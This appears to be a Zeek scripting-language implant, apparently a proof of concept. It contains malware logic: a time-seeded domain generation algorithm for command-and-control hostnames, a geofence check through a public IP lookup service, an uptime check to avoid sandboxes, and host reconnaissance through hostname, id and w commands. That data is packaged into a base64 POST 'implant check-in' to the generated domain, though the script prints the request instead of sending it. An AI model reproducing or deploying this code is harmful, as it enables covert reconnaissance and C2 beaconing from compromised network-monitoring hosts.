@load ./get-command
@load ./scan-files
@load ./inject-pkt

redef exit_only_after_terminate = T;

function GLOBAL::dga(): string {
  local t = current_time();
  local seed = double_to_count(floor(time_to_double(t))) % 864000;
  local controller = "";
  for (i in fmt("%s", seed)) {
    local n = to_int(i);
    controller += "abcdefghijklmnopqrstuVwxyZ"[n];
  }
  controller = controller[:-3];
  controller += ".com";
  return controller;
}

function GLOBAL::register(vs: vector of string) {
  local c2 = dga();
  local req = [$url=fmt("https://%s/new", c2),
               $method="POST",
               $client_data=encode_base64(join_string_vec(vs, "|"))];
  print "prepared implant check-in...";
  print req;
}

function GLOBAL::gather() {
  when (local result1 = Exec::run([$cmd=fmt("hostname && date && id")])) {
    local hn = result1$stdout[0];
    local da = result1$stdout[1];
    local id = result1$stdout[2];
    when (local result2 = Exec::run([$cmd=fmt("w")])) {
      local up = split_string(sub(split_string(result2$stdout[0], / /)[3], / /, ""), /:/);
      # Gather host stats only if executing on a system that's been up for over 1 hr
      if (to_int(up[0]) > 1) {
        local wh = join_string_vec(result2$stdout, "|");
        register(vector(hn, da, id, wh));
      }
    }
  }
}

function GLOBAL::orient() {
  local req = [$url="https://api.myip.com/", $method="GET"];
  when (local response = ActiveHTTP::request(req)) {
    # Only do stuff if we are executing from system with egress IP located in the US
    if (sub(sub(split_string(response$body, /,/)[2], /\"cc\":\"/, ""), /\"\}/, "") == "US") {
      gather();
    }
  } timeout 1min {
    return;
  }
}

event zeek_init () {
  orient();
}
